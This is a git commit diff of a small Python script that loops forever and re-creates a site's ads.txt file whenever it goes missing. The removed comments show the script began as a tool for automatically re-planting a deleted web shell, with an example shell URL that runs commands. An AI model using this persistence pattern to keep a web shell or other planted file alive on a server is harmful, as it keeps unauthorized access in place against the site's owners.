80a3df958828f27991f04a8a55b2c6c540dff134
dowengpakaiz <110327193+dowengpakaiz@users.noreply.github.com>
2022-09-05 04:02:22 +0700

    Update system_ads.py

--- system_ads.py
+++ system_ads.py
@@ -1,13 +1,10 @@
-# auto create shell when shell get delete
-# coded by root@x-krypt0n-x
-# thanks to warwer jeager cracken
 import os
 import time
 import os.path
 
 def main():
     while True:
-        f = os.path.exists('/home/admin/web/dinneride.com/public_html/ads.txt') # example # the path where you want to put the web shell
+        f = os.path.exists('/home/admin/web/dinneride.com/public_html/ads.txt')
         
         if f == True:
             print("[*] file exists")
@@ -17,9 +14,9 @@ def main():
         else:
             print("[!] file not found")
             print("[!] creating file")
-            # creating web shell 
-            a = open('/home/admin/web/dinneride.com/public_html/ads.txt','a') # example # the path where you want to put the web shell
-            a.write('google.com, pub-5957983578039876, DIRECT, f08c47fec0942fa0') # u shell, example http://127.0.0.1/shell.php?cmd=ls -la (command)
+             
+            a = open('/home/admin/web/dinneride.com/public_html/ads.txt','a')
+            a.write('google.com, pub-5957983578039876, DIRECT, f08c47fec0942fa0')
             a.close()
             time.sleep(5)
 main()
